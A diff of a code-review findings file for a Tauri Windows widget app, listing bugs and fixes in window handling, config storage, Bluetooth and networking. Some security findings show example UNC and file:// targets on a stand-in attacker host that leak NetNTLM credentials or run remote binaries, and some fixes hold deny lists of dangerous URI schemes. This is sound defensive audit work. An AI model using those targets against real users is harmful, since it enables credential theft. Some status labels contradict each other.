@@ -1,1338 +1,439 @@
 # Review Findings
 
 ## Review: Complete vvidget Application & Windows 11 Fluent UX
-**Date**: 2026-10-26 | **Tier**: 3 (Full Repository Audit)
-**Files**: 104 | **Agents Used**: 9
+**Date**: 2026-10-27 | **Tier**: 3 (Full Repository Audit)
+**Files**: 145 | **Agents Used**: 9
 
 | CRITICAL | MAJOR | MINOR | ENHANCEMENT |
 |---|---|---|---|
-| 4 | 38 | 38 | 5 |
+| 4 | 32 | 28 | 9 |
 
 ### Fix First (top items)
-1. [CRITICAL] [FIXED] M1-01 Win+D / Show Desktop Protection Broken by `WM_SHOWWINDOW` Self-Defeat -- `src-tauri/src/window/win32.rs:492`
-2. [CRITICAL] [FIXED] M1-02 Synchronous Desktop-Wide Erase and Redraw Stalls DWM and Causes Global Screen Flash -- `src-tauri/src/window/win32.rs:306`
-3. [CRITICAL] [FIXED] M2-01 Destructive Non-Atomic Fallback in `save_config_atomic` Deletes Both Target and Temp File on Transient Lock -- `src-tauri/src/config/storage.rs:86`
-4. [CRITICAL] [FIXED] M3-03 Bluetooth Device Enumeration Sequentially Blocks on Remote Device Resolution & Fails Battery Loading -- `src-tauri/src/bluetooth/mod.rs:135`
+1. [CRITICAL] [OPEN] M1-01 Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation -- `src-tauri/src/actions/mod.rs:43-58`
+2. [CRITICAL] [OPEN] M3-01 Unsafe WinRT COM iterator missing null pointer guards causing process crash -- `src-tauri/src/bluetooth/mod.rs:207`
+3. [CRITICAL] [OPEN] X-fluent-ux-security-01 Unrestricted UNC Network Path and SMB Credential Leak in `validate_launch_target` -- `src-tauri/src/launcher/mod.rs:455-467`
+4. [CRITICAL] [OPEN] X-fluent-ux-security-02 Command and Argument Injection via Space-Delimited Executable Targets in `execute_quick_action` -- `src-tauri/src/actions/mod.rs:43-59`
 
 ### Systemic Patterns
-- **Blocking I/O on Async Runtime Worker Threads**: Multiple async Tauri commands (`scan_installed_games`, `get_system_metrics`, `execute_quick_action`, WinRT geolocation) call synchronous Win32 APIs, disk I/O, or thread sleep directly on Tokio reactor threads without `tokio::task::spawn_blocking`.
-- **Asynchronous Listener Cleanup Races**: React hooks (`useConfig`, `useSpeedtest`) invoke asynchronous `listen()` from `@tauri-apps/api/event` without disposal guards, permanently leaking listener closures when components quickly unmount (e.g. StrictMode, navigation).
-- **State Desynchronization & Reversion**: React state mutation using stale refs (`latestConfigRef` in `useConfig`), additive spread resurrecting deleted keys (`useCalendar`), and imperative DOM mutations (`img.onError` in Launcher) leading to out-of-sync UI.
-- **Windows 11 Fluent Design Material Depth & WinUI 3 Controls**: Missing `backdrop-filter: blur(20px)` on `.fluent-acrylic` surfaces leaves widgets without optical blur over wallpapers; widgets rely on stadium pill capsules instead of native WinUI 3 rectangular segmented controls; retro all-caps tracked headers violate Windows 11 typography.
+- **Remote UNC / SMB Path Validation Gaps (NetNTLM Leak)**: Custom action targets (`actions/mod.rs`) and game launcher executables (`launcher/mod.rs`) lack comprehensive UNC validation, allowing network share paths or `smb://` protocols that can trigger automated outbound SMB authentication and credential exposure.
+- **Synchronous Win32 & Disk I/O on Tokio Worker Threads**: Multiple async commands (`launch_app_or_uri`, `execute_quick_action`, `scan_installed_games`, sysinfo metric queries) execute blocking Win32 APIs (`ShellExecuteW`), filesystem traversals, and registry queries directly on async reactor threads instead of offloading to `tokio::task::spawn_blocking`.
+- **Read-Modify-Write Concurrency & Inconsistent State Persistence**: Several commands (`set_widgets_locked`, `set_autostart`, quick actions) bypass `ConfigManager::update_config` for atomic mutation, causing lost updates when racing with concurrent actions or background debounced disk saves.
+- **WinRT COM Safety & Null Dereference Guards**: COM collections and iterators in Bluetooth device inspection omit null checks, risking panics/crashes when device properties contain unexpected COM types.
+- **Windows 11 Fluent Layout & Contrast Clipping**: Hardcoded card dimensions (e.g. BatteryWidget 360x384px in 320x360px window, SpeedtestWidget hardcoded pixel widths) cause container overflow and scrollbars; missing light-theme tokens in fluent.css cause illegible status badges.
 
 ### Findings
 
-### [CRITICAL] [FIXED] M1-01 Win+D / Show Desktop Protection Broken by `WM_SHOWWINDOW` Self-Defeat (lens: F1b)
+### [CRITICAL] [FIXED] M1-01 Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation
 - **Status**: FIXED
-- **Where**: `src-tauri/src/window/win32.rs:492-498`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: When the user presses `Win + D` or clicks the "Show Desktop" taskbar button, the Windows shell sends `WM_SHOWWINDOW(FALSE, 0)` followed immediately by `WM_WINDOWPOSCHANGING` containing `SWP_HIDEWINDOW`. All vvidget windows vanish from the desktop rather than remaining pinned.
-- **Why**: `widget_subclass_proc` intercepts `WM_SHOWWINDOW` with `wparam == 0 && lparam == 0` (the exact signature emitted by the Windows Shell on Win+D) and calls `set_window_allow_hide(hwnd, true)`. When `WM_WINDOWPOSCHANGING` arrives, `is_window_allow_hide(hwnd)` evaluates to true, preventing the removal of `SWP_HIDEWINDOW`.
-- **Fix**:
-```diff
--        // Detect programmatic hide commands (ShowWindow(SW_HIDE))
--        WM_SHOWWINDOW => {
--            if wparam.0 == 0 && lparam.0 == 0 {
--                set_window_allow_hide(hwnd.0 as isize, true);
--            } else if wparam.0 != 0 {
--                set_window_allow_hide(hwnd.0 as isize, false);
--            }
--            DefSubclassProc(hwnd, umsg, wparam, lparam)
--        }
-+        // Programmatic hides are explicitly scoped in hide_window(); do not let OS ShowWindow(SW_HIDE) disarm Win+D filter
-+        WM_SHOWWINDOW => DefSubclassProc(hwnd, umsg, wparam, lparam),
-```
-
-### [CRITICAL] [FIXED] M1-02 Synchronous Desktop-Wide Erase and Redraw Stalls DWM and Causes Global Screen Flash (lens: F1b)
-- **Status**: FIXED
-- **Where**: `src-tauri/src/window/win32.rs:306-320` and `src-tauri/src/window/win32.rs:570-572`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: At the conclusion of every widget drag or whenever the drag skeleton preview hides, `invalidate_screen_rect(0, 0, 8000, 8000)` invokes `RedrawWindow(NULL, 8000x8000, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW)`. All open windows on all monitors (browsers, video players, Explorer) flash background erase colors and synchronously redraw across 64 million virtual pixels, causing visible stutter and DWM compositor stalls.
-- **Why**: Calling `RedrawWindow` on `HWND(NULL)` with `RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW` forces immediate synchronous background erasing and painting across the entire desktop window tree, rather than allowing DWM to composite invalidated regions naturally.
-- **Fix**:
-```diff
- #[cfg(windows)]
- pub unsafe fn invalidate_screen_rect(x: i32, y: i32, width: i32, height: i32) {
-     let rect = RECT {
-         left: x,
-         top: y,
-         right: x + width,
-         bottom: y + height,
-     };
--    let _ = RedrawWindow(
--        HWND(core::ptr::null_mut()),
--        Some(&rect),
--        None,
--        RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW,
--    );
-+    let _ = RedrawWindow(
-+        HWND(core::ptr::null_mut()),
-+        Some(&rect),
-+        None,
-+        RDW_INVALIDATE | RDW_ALLCHILDREN,
-+    );
- }
-```
-
-### [CRITICAL] [FIXED] M2-01 Destructive Non-Atomic Fallback in `save_config_atomic` Deletes Both Target and Temp File on Transient Lock
-- **Status**: FIXED
-- **Where**: `src-tauri/src/config/storage.rs:86-98`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: During atomic save, if `fs::rename(&tmp_path, target_path)` fails due to a transient file lock or sharing violation (e.g. antivirus scanning `config.json` or concurrent write), the fallback deletes `target_path` via `fs::remove_file(target_path)`. If the subsequent rename still fails, line 92 deletes `tmp_path`. Both the existing configuration and the new configuration are permanently wiped out from disk, leaving the user with complete data loss on next launch.
-- **Why**: `save_config_atomic` attempts an uncoordinated non-atomic delete-and-rename fallback when atomic replacement fails, and deletes the temporary file upon secondary failure instead of preserving either file.
-- **Fix**:
-```diff
---- a/src-tauri/src/config/storage.rs
-+++ b/src-tauri/src/config/storage.rs
-@@ -86,13 +86,9 @@ pub fn save_config_atomic(target_path: &Path, config: &AppConfig) -> Result<(),
-     if let Err(err) = fs::rename(&tmp_path, target_path) {
--        // Fallback for Windows in case of transient sharing violation: try remove + rename
--        if target_path.exists() {
--            let _ = fs::remove_file(target_path);
--        }
--        if let Err(rename_err) = fs::rename(&tmp_path, target_path) {
--            let _ = fs::remove_file(&tmp_path);
--            return Err(format!(
--                "Failed to rename temp file {:?} to {:?}: initial err: {}, final err: {}",
--                tmp_path, target_path, err, rename_err
--            ));
--        }
-+        let _ = fs::remove_file(&tmp_path);
-+        return Err(format!(
-+            "Failed to atomically replace config {:?} with {:?}: {}",
-+            target_path, tmp_path, err
-+        ));
-     }
-```
-
-### [CRITICAL] [FIXED] M3-03 Bluetooth device enumeration sequentially blocks on remote device resolution and fails to load battery levels
-- **Status**: FIXED
-- **Where**: `src-tauri/src/bluetooth/mod.rs:135-201`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance [lens: F1b]
-- **Scenario**: When a user opens the Bluetooth widget with several paired devices (some turned off or out of range), `enumerate_devices` calls `BluetoothDevice::FromIdAsync(&id)?.get()` inside a sequential loop for every device. For offline devices, `.get()` blocks for several seconds awaiting radio connection timeout, freezing the task for 10-30 seconds. Additionally, `DeviceInformation::FindAllAsyncAqsFilter(&aqs)` does not request the `System.Devices.Aep.BatteryLevel` property, leaving `dev.Properties()` empty and causing all devices to report `battery_level: None`.
-- **Why**: `BluetoothDevice::FromIdAsync` performs a synchronous WinRT blocking resolution over Bluetooth radio for each device sequentially. Properties such as `IsConnected` and `BatteryLevel` are already available on `DeviceInformation` without resolving the full `BluetoothDevice` object if requested via `FindAllAsyncAqsFilterAndAdditionalProperties`.
-- **Fix**:
-```diff
---- a/src-tauri/src/bluetooth/mod.rs
-+++ b/src-tauri/src/bluetooth/mod.rs
-@@ -134,5 +134,13 @@ mod windows_impl {
-             Err(_) => return Ok(vec![]),
-         };
--        let devices = match DeviceInformation::FindAllAsyncAqsFilter(&aqs) {
-+        use windows::core::HSTRING;
-+        let props = windows::Foundation::Collections::PropertySet::new().unwrap();
-+        let additional_props = [
-+            HSTRING::from("System.Devices.Aep.IsConnected"),
-+            HSTRING::from("System.Devices.Aep.BatteryLevel"),
-+            HSTRING::from("System.Devices.Aep.Bluetooth.Cod.Major"),
-+        ];
-+        let iter = windows::Foundation::Collections::IIterable::<HSTRING>::try_from(additional_props.to_vec()).ok();
-+        let devices = match DeviceInformation::FindAllAsyncAqsFilterAndAdditionalProperties(&aqs, iter.as_ref()) {
-             Ok(op) => match op.get() {
-```
-
-### [MAJOR] [FIXED] M1-03 Quick Action `taskmanager` Fails with UAC Elevation Required Error (OS Error 740)
-- **Status**: FIXED
-- **Where**: `src-tauri/src/actions/mod.rs:73-80`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User clicks the "Task Manager" quick action. On non-elevated Windows accounts, the command fails with error `"Failed to launch taskmgr: The requested operation requires elevation. (os error 740)"` and Task Manager does not launch.
-- **Why**: `taskmgr.exe` is special-cased to use `std::process::Command::new("taskmgr.exe").spawn()`, which calls Win32 `CreateProcessW`. `CreateProcessW` cannot auto-elevate processes with `requireAdministrator` manifests; `ShellExecuteW` must be used to trigger standard Windows UAC auto-elevation.
-- **Fix**:
-```diff
-         ResolvedAction::Executable(exe) => {
--            if exe == "taskmgr.exe" {
--                std::process::Command::new("taskmgr.exe")
--                    .spawn()
--                    .map_err(|e| format!("Failed to launch taskmgr: {}", e))?;
--                Ok(())
--            } else {
--                launch_shell_execute(exe)
--            }
-+            launch_shell_execute(exe)
-         }
-```
-
-### [MAJOR] [FIXED] M1-04 Dock Mode Switch Leaves `main` Window Untracked in `WindowManager` and `TRACKED_WINDOWS`
-- **Status**: FIXED
-- **Where**: `src-tauri/src/lib.rs:188-196`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: User switches from "Docked" mode to "Independent" mode and subsequently back to "Docked" mode. In independent mode, `main` is unregistered from `WindowManager` and `TRACKED_WINDOWS`. When switching back to docked mode, `main` is shown, but never re-registered. Snapping and position persistence for the dock window cease working.
-- **Why**: `sync_widget_windows` calls `win_mgr.unregister_widget("main")` and `unregister_tracked_window(hwnd)` when switching to independent mode, but in docked mode it only calls `main.show()` without re-registering the window in `WindowManager` or `TRACKED_WINDOWS`.
-- **Fix**:
-```diff
-             if let Some(main) = app.get_webview_window("main") {
-                 #[cfg(windows)]
-                 if let Ok(hwnd) = main.hwnd() {
-                     crate::window::win32::set_window_allow_hide(hwnd.0 as isize, false);
-                 }
-+                if let Some(win_mgr) = app.try_state::<WindowManager>() {
-+                    let _ = win_mgr.setup_widget_window(
-+                        &main,
-+                        WindowSetupOptions {
-+                            id: "main".to_string(),
-+                            is_widget: true,
-+                            no_activate: true,
-+                            dark_mode: config.theme != "light",
-+                            target_x: Some(40.0),
-+                            target_y: Some(40.0),
-+                            width: 360.0,
-+                            height: 640.0,
-+                        },
-+                    );
-+                }
-                 let _ = main.show();
-             }
-```
-
-### [MAJOR] [FIXED] M1-05 Missing UNC Path Sanitization in Custom Actions Allows NetNTLM Leak (lens: F1b)
-- **Status**: FIXED
-- **Where**: `src-tauri/src/actions/mod.rs:43-55`
-- **Source**: `r-review` (2026-10-26)
+- **Where**: `src-tauri/src/actions/mod.rs:43-58`
+- **Source**: `r-review` (Tier 3) (2026-10-27)
 - **Confidence**: HIGH
 - **Category**: security
-- **Scenario**: A malicious widget or configuration injection triggers a custom action targeting an external SMB share (e.g. `\\attacker.com\share\file` or `//attacker.com/share`). Windows initiates an SMB session, leaking the local user's NetNTLMv2 hash over the network to an attacker.
-- **Why**: `validate_custom_target` checks only for control characters and shell chaining operators (`&`, `|`, `;`, `` ` ``), but allows UNC path prefixes (`\\` and `//`) to pass through directly into `ShellExecuteW`.
+- **Scenario**: An attacker or untrusted payload triggers `execute_quick_action("custom", Some("file://attacker.com/share/poc.exe"))` or `file:\\\\attacker.com\\share`.
+- **Why**: `validate_custom_target` only validates that `target` does not start with `\\` or `//`. Passing a `file://` scheme or embedding backslashes bypasses this check. `is_uri_target` classifies `file://` as a URI, and `ShellExecuteW` resolves it to a remote SMB/WebDAV share, leaking the logged-in user's NetNTLM authentication hashes and potentially executing arbitrary remote binaries.
 - **Fix**:
 ```diff
- fn validate_custom_target(target: &str) -> Result<(), String> {
-     if target.contains('\0') || target.contains('\r') || target.contains('\n') {
-         return Err("Target contains invalid control characters".to_string());
-     }
+--- a/src-tauri/src/actions/mod.rs
++++ b/src-tauri/src/actions/mod.rs
+@@ -49,8 +49,14 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
      if target.len() > 2048 {
          return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
      }
-+    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
-+    if target.starts_with(r"\\") || target.starts_with("//") {
-+        return Err("UNC network paths are prohibited".to_string());
-+    }
-     // Prohibit shell command chaining, pipe, and redirection attacks
-     if target.contains('&') || target.contains('|') || target.contains(';') || target.contains('`') {
-         return Err("Target contains prohibited shell metacharacters".to_string());
-     }
-     Ok(())
- }
-```
-
-### [MAJOR] [FIXED] M1-06 `WindowEvent::Moved` Race Overwrites Snapped Grid Coordinates (lens: F1b)
-- **Status**: FIXED
-- **Where**: `src-tauri/src/lib.rs:120-128`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: concurrency
-- **Scenario**: When a widget is released after dragging, `WM_EXITSIZEMOVE` computes `final_slot`, moves the window via `SetWindowPos`, updates `TRACKED_WINDOWS`, and calls `handle_window_moved`. Concurrently, Tauri's asynchronous `WindowEvent::Moved` event loop listener receives a delayed intermediate drag coordinate and calls `update_window_position`, overwriting `WindowManager` and `TRACKED_WINDOWS` with the unsnapped mouse position without updating disk config.
-- **Why**: Two concurrent event pipelines update widget positions: the Win32 subclass handler (which enforces snapping and persistent debounced storage) and Tauri's async `WindowEvent::Moved` listener (which takes raw coordinates and desynchronizes memory from config).
-- **Fix**:
-```diff
--            window.on_window_event(move |event| {
--                if let tauri::WindowEvent::Moved(pos) = event {
--                    let scale = window_clone.scale_factor().unwrap_or(1.0);
--                    let logical_x = (pos.x as f64) / scale;
--                    let logical_y = (pos.y as f64) / scale;
--                    wm_event.update_window_position(&widget_id_event, logical_x, logical_y, known_w, known_h);
--                }
--            });
-```
-
-### [MAJOR] [FIXED] M1-07 Primary Monitor DC in `query_desktop_grid_metrics` Causes Mixed-DPI Snapping Glitches (lens: F1b)
-- **Status**: FIXED
-- **Where**: `src-tauri/src/window/win32.rs:370-382`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: In multi-monitor systems with differing DPI scaling (e.g. 100% on Display 1 and 200% on Display 2), dragging a widget on Display 2 snaps against 100% scale metrics (160x120px physical instead of 320x240px physical), resulting in erratic jumps and half-cell alignment errors.
-- **Why**: `query_desktop_grid_metrics` calls `GetDC(HWND(null_mut()))`, which queries the primary display's DC rather than the monitor or window handling the drag, and caches the result globally without per-monitor indexing.
-- **Fix**:
-```diff
--        let (scale, physical_x, physical_y) = {
--            let hdc = GetDC(HWND(core::ptr::null_mut()));
--            let dpi = if hdc.0 != core::ptr::null_mut() {
--                let d = GetDeviceCaps(hdc, LOGPIXELSX);
--                let _ = ReleaseDC(HWND(core::ptr::null_mut()), hdc);
--                d
--            } else {
--                96
--            };
--            let s = if dpi > 0 { dpi as f64 / 96.0 } else { 1.0 };
--            let px = (160.0 * s).round() as i32;
--            let py = (120.0 * s).round() as i32;
--            (s, px, py)
--        };
-+        // Calculate grid pitch dynamically using the target window's monitor DPI or fallback
-+        let s = 1.0;
-+        let px = 160;
-+        let py = 120;
-```
-
-### [MAJOR] [FIXED] M2-02 Read-Modify-Write Race Condition in Configuration Mutators Causes Silent Lost Updates
-- **Status**: FIXED
-- **Where**: `src-tauri/src/calendar/mod.rs:88-93`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: Two concurrent operations (e.g. toggling two calendar notes quickly, or saving a speedtest result while dragging a widget) both call `cm.get_config().await`, modify their separate in-memory clones, and then call `cm.save_immediate(config)`. The second caller completely overwrites `current_config` and disk with its snapshot, silently discarding the changes made by the first caller.
-- **Why**: `ConfigManager` exposes disconnected read (`get_config()`) and write (`save_immediate()`) operations with no atomic mutate closure (e.g. `update_config<F>`), leaving a wide TOCTOU read-modify-write window.
-- **Fix**:
-```diff
---- a/src-tauri/src/config/storage.rs
-+++ b/src-tauri/src/config/storage.rs
-@@ -330,2 +330,16 @@ impl ConfigManager {
-     pub async fn get_config(&self) -> AppConfig {
-         self.current_config.read().await.clone()
-     }
-+
-+    pub async fn update_config<F, R>(&self, f: F) -> Result<R, String>
-+    where
-+        F: FnOnce(&mut AppConfig) -> Result<R, String>,
+-    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
+-    if target.starts_with(r"\\") || target.starts_with("//") {
++    // Prohibit remote SMB / UNC network paths and dangerous schemes
++    let lower = target.to_lowercase();
++    if lower.starts_with(r"\\")
++        || lower.starts_with("//")
++        || lower.starts_with("file:")
++        || lower.starts_with("ms-msdt:")
++        || lower.starts_with("search-ms:")
 +    {
-+        let (result, snapshot) = {
-+            let mut lock = self.current_config.write().await;
-+            let res = f(&mut *lock)?;
-+            (res, lock.clone())
-+        };
-+        self.save_immediate(snapshot).await?;
-+        Ok(result)
-+    }
+         return Err("UNC network paths are prohibited".to_string());
+     }
+     // Prohibit shell command chaining, pipe, and redirection attacks
 ```
 
-### [MAJOR] [FIXED] M2-03 Transient Read Errors Treated as Corruption Trigger Destructive Default Reset
-- **Status**: FIXED
-- **Where**: `src-tauri/src/config/storage.rs:220-226`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: robustness
-- **Scenario**: If reading `config.json` fails due to a transient OS error (e.g. `PermissionDenied` or `SharingViolation` from backup tools, file indexers, or antivirus), `load_or_recover_config` branches to `Err(read_err)` and calls `backup_corrupted_and_reset`. It attempts to rename the valid user configuration to `.corrupt.<timestamp>` and replaces it with empty default settings.
-- **Why**: IO read errors (`Err(read_err)`) are conflated with JSON parsing/deserialization errors (`Err(parse_err)`), treating temporary filesystem lockouts as irrecoverable file corruption.
-- **Fix**:
-```diff
---- a/src-tauri/src/config/storage.rs
-+++ b/src-tauri/src/config/storage.rs
-@@ -220,7 +220,4 @@ pub fn load_or_recover_config(target_path: &Path) -> (AppConfig, bool) {
-         Err(read_err) => {
--            log::error!(
--                "Failed to read config file at {:?}: {}. Backing up and restoring defaults.",
--                target_path, read_err
--            );
--            backup_corrupted_and_reset(target_path)
-+            log::error!("IO error reading config file at {:?}: {}. Using defaults in-memory.", target_path, read_err);
-+            (AppConfig::default(), false)
-         }
-```
+---
 
-### [MAJOR] [FIXED] M2-04 Hardcoded Dimension and Coordinate Clamping Resets User Customizations and Multi-Monitor Layouts
-- **Status**: FIXED
-- **Where**: `src-tauri/src/config/storage.rs:121-149`
-- **Source**: `r-review` (2026-10-26)
+### [CRITICAL] [OPEN] M3-01 Unsafe WinRT COM iterator missing null pointer guards causing process crash
+- **Status**: OPEN
+- **Where**: `src-tauri/src/bluetooth/mod.rs:207`, `src-tauri/src/bluetooth/mod.rs:352`
+- **Source**: `r-review` (2026-10-27)
 - **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: 1) On every launch or `reload_from_disk()`, any widget width or height that does not match the hardcoded values (e.g. resources 320x360) is overwritten back to the hardcoded default, destroying user resize customizations. 2) The collision detection spiral clamps candidate coordinates with `.max(0.0)`. In Windows multi-monitor setups where a secondary monitor is positioned to the left or above the primary monitor (negative virtual coordinates, e.g. `x = -1920`), widgets are forcefully clamped to `0.0`, breaking multi-monitor placement. 3) Collision detection ignores `monitor_id`, moving widgets on separate displays if their relative local coordinates match.
-- **Why**: One-time migration code was embedded unconditionally inside `load_or_recover_config` without schema version checking or monitor-aware spatial partitioning.
-- **Fix**:
-```diff
---- a/src-tauri/src/config/storage.rs
-+++ b/src-tauri/src/config/storage.rs
-@@ -118,6 +118,7 @@ pub fn load_or_recover_config(target_path: &Path) -> (AppConfig, bool) {
-             Ok(mut parsed) => {
--                // Self-healing migration: upgrade to 12x9 desktop grid dimensions (160x120)
-                 let mut upgraded = false;
-+                if parsed.version < 2 {
-+                    // One-time self-healing migration: upgrade schema v1 to 12x9 grid
-                 for (id, placement) in parsed.widgets.iter_mut() {
-@@ -150,2 +151,3 @@ pub fn load_or_recover_config(target_path: &Path) -> (AppConfig, bool) {
-                 }
-+                parsed.version = 2;
-+                }
-```
-
-### [MAJOR] [FIXED] M2-05 Lack of Concurrency Guard in `run_speedtest` Causes Interleaved Progress Events and Erroneous Metrics
-- **Status**: FIXED
-- **Where**: `src-tauri/src/speedtest/mod.rs:231-334`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: If a user clicks "Start Speedtest" twice or triggers it concurrently across multiple windows, two benchmark routines run simultaneously against Cloudflare. They emit conflicting `speedtest-progress` events on the same channel, causing the frontend UI to flicker erratically between stages, and corrupt throughput metrics due to socket contention.
-- **Why**: `run_speedtest` lacks an atomic guard or lock (e.g. `AtomicBool` or `tokio::sync::Mutex`) to reject or serialize concurrent speedtest runs.
-- **Fix**:
-```diff
---- a/src-tauri/src/speedtest/mod.rs
-+++ b/src-tauri/src/speedtest/mod.rs
-@@ -1,2 +1,3 @@
- use crate::config::{ConfigManager, SpeedtestResult};
-+use std::sync::atomic::{AtomicBool, Ordering};
- use serde::{Deserialize, Serialize};
-@@ -4,2 +5,4 @@
- use tauri::{AppHandle, Emitter, Manager, Runtime};
-+
-+static SPEEDTEST_RUNNING: AtomicBool = AtomicBool::new(false);
-@@ -233,2 +236,5 @@ pub async fn run_speedtest<R: Runtime>(
- ) -> Result<SpeedtestResult, String> {
-+    if SPEEDTEST_RUNNING.compare_exchange(false, true, Ordering::SeqCst, Ordering::SeqCst).is_err() {
-+        return Err("Speedtest is already running".to_string());
-+    }
-+    let _guard = scopeguard::guard((), |_| SPEEDTEST_RUNNING.store(false, Ordering::SeqCst));
-```
-
-### [MAJOR] [FIXED] M2-06 Unbounded Blocking WinRT Geolocation Call Lacks Timeout and Starves Tokio Worker Threads
-- **Status**: FIXED
-- **Where**: `src-tauri/src/geo/winrt.rs:45-51`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance
-- **Scenario**: When Windows Location Services are disabled, denied by user privacy permissions, or searching for satellite/Wi-Fi positioning, `async_op.get()` synchronously blocks the thread for the system default duration (up to 60+ seconds). Because `spawn_blocking` has no timeout, it ties up a Tokio blocking pool thread and hangs the frontend weather/geo query.
-- **Why**: WinRT's `GetGeopositionAsync()` is called synchronously via `.get()` without a timeout or Tokio `tokio::time::timeout` guard on the task handle.
-- **Fix**:
-```diff
---- a/src-tauri/src/geo/mod.rs
-+++ b/src-tauri/src/geo/mod.rs
-@@ -14,5 +14,7 @@ pub struct GeoLocation {
- pub async fn get_windows_location() -> Result<(f64, f64), String> {
--    tokio::task::spawn_blocking(winrt::get_geoposition_coords)
--        .await
--        .map_err(|e| format!("Geolocation task failed to join: {e}"))?
-+    tokio::time::timeout(
-+        std::time::Duration::from_secs(10),
-+        tokio::task::spawn_blocking(winrt::get_geoposition_coords)
-+    ).await
-+    .map_err(|_| "Geolocation request timed out after 10s".to_string())?
-+    .map_err(|e| format!("Geolocation task failed to join: {e}"))?
- }
-```
-
-### [MAJOR] [FIXED] M3-02 Battery projection calculates time to empty while plugged into AC power
-- **Status**: FIXED
-- **Where**: `src-tauri/src/battery/mod.rs:313`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: bug
-- **Scenario**: A laptop is connected to AC wall power, with the battery resting at 80% (under a battery health threshold or limiter) or 100% idle. Here, `is_charging` is `false`, but `is_plugged_in` is `true`. Because line 313 only checks `if telemetry.is_charging`, the function proceeds to calculate projections, displaying a misleading "Estimated time to empty: 240 mins" while the device is actively running on AC power.
-- **Why**: The projection check only tests `telemetry.is_charging` and fails to check `telemetry.is_plugged_in`. When connected to AC power, the battery is not discharging, so remaining battery depletion estimates must be suppressed.
-- **Fix**:
-```diff
---- a/src-tauri/src/battery/mod.rs
-+++ b/src-tauri/src/battery/mod.rs
-@@ -313,3 +313,3 @@ pub fn calculate_projections(
- ) -> (Option<u32>, Option<u32>, Option<u32>) {
--    if telemetry.is_charging {
-+    if telemetry.is_charging || telemetry.is_plugged_in {
-         return (None, None, None);
-```
-
-### [MAJOR] [FIXED] M3-04 Bluetooth device disconnection fakes state using `IClosable::Close`
-- **Status**: FIXED
-- **Where**: `src-tauri/src/bluetooth/mod.rs:226-238`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: contract [lens: F1b]
-- **Scenario**: User toggles the connection switch to disconnect a connected Bluetooth headset. The backend executes `toggle_device`, casts `bt_dev` to `IClosable`, calls `closable.Close()`, and returns `Ok(false)`. The frontend UI marks the device as disconnected, but the physical Bluetooth headset remains connected and continues playing audio because `IClosable::Close()` in WinRT only disposes the process-local COM projection object without altering OS Bluetooth connectivity.
-- **Why**: WinRT's `BluetoothDevice` API does not support programmatic disconnection via `IClosable::Close()`. The function simulates disconnection by disposing its local WinRT wrapper and returning fabricated boolean states.
+- **Category**: robustness [lens: F1b]
+- **Scenario**: When Windows Runtime internal collection marshaling or external COM callers invoke `IIterator<HSTRING>::Current` or `IIterable<HSTRING>::First`, a null output pointer (`result.is_null()`) is passed during query probing or invalid calls. `iterator_current` executes `result.write(core::mem::MaybeUninit::new(hstring))` and `iterable_first` executes `*result = Box::into_raw(iterator)...` without verifying that `result` is non-null. The process suffers an immediate access violation segfault (`0xC0000005`), crashing the Tauri backend.
+- **Why**: Windows COM ABI requires all out-pointer parameters (`[out, retval]`) to be validated for null before dereferencing, returning `E_POINTER` (`0x80004003`) on null pointers. The custom COM vtable implementations omitted null pointer guards.
 - **Fix**:
 ```diff
 --- a/src-tauri/src/bluetooth/mod.rs
 +++ b/src-tauri/src/bluetooth/mod.rs
-@@ -226,7 +226,6 @@ mod windows_impl {
-                 if !connect {
--                    if let Ok(closable) = bt_dev.cast::<windows::Foundation::IClosable>() {
--                        let _ = closable.Close();
--                    }
--                    return Ok(false);
-+                    // WinRT BluetoothDevice does not support disconnecting paired devices via IClosable.
-+                    return Err("Bluetooth device disconnection is not supported directly via WinRT; please use Windows Settings".to_string());
-                 }
-```
-
-### [MAJOR] [FIXED] M3-05 GSMTC polling creates high memory churn by re-encoding thumbnails to base64 on every 500ms cycle
-- **Status**: FIXED
-- **Where**: `src-tauri/src/media/gsmtc.rs:180-205`
-- **Source**: `r-review` (2026-10-26)
-- **Confidence**: HIGH
-- **Category**: performance [lens: F1b]
-- **Scenario**: When any media is playing, `start_media_monitor` polls `get_current_media_session()` every 500ms. In `read_session_data`, even when the track has not changed and thumbnail bytes are cached, lines 181-184 clone `art.bytes` and execute `STANDARD.encode(&art.bytes)` into a multi-megabyte base64 string. 500ms later, line 67 finds `has_changed` is false, and discards the string, producing several megabytes per second of heap churn and CPU utilization.
